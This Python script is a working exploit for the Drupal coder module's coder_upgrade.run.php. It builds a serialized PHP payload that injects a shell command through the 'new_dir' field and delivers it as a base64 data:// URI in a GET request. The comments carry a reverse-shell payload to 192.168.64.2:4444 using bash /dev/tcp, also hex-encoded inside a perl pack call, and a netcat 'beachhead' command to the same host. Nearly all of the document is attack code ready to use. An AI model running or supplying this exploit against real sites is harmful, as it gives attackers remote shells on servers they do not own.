from base64 import b64encode
import requests

# Payload translation: bash -c '0<&108-;exec 108<>/dev/tcp/192.168.64.2/4444;sh <&108 >&108 2>&108'
# PAYLOAD = 'perl -e \'system(pack(qq,H152,,qq,62617368202d632027303c263130382d3b65786563203130383c3e2f6465762f7463702f3139322e3136382e36342e322f343434343b7368203c26313038203e2631303820323e2631303827,))\''
WEBSERVER_PATH = '/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php'
BEACHHEAD = 'nc 192.168.64.2 37123'


def create_exploit(payload: str) -> str:
    p = ''
    p += 'a:6:{s:5:"paths";a:3:{s:12:"modules_base";s:8:"../../..";s:10:"files_base";s:5:"../..";s:14:"libraries_base";s:5:"../..";}'
    p += 's:11:"theme_cache";s:16:"theme_cache_test";'
    p += 's:9:"variables";s:14:"variables_test";'
    p += 's:8:"upgrades";a:1:{i:0;a:2:{s:4:"path";s:2:"..";s:6:"module";s:3:"foo";}}'
    p += 's:10:"extensions";a:1:{s:3:"php";s:3:"php";}'
    p += 's:5:"items";a:1:{i:0;a:3:{s:7:"old_dir";s:12:"../../images";'
    p += 's:7:"new_dir";s:'
    p += str(len(payload) + 5)
    p += ':"-v;'
    p += payload
    p += ' #";s:4:"name";s:4:"test";}}}'

    pl = "data://text/plain;base64," + b64encode(bytes(p, 'utf-8')).decode('utf-8')
    
    return pl

 
def create_request(ip_addr: str) -> str:
    url = "http://" + ip_addr + WEBSERVER_PATH
    params = { 'file': create_exploit(BEACHHEAD) }
    return requests.get(url=url, params=params)
    

def create_payload(to_execute: str) -> str:
    return 'perl -e \'system(' + to_execute + ')\''
        
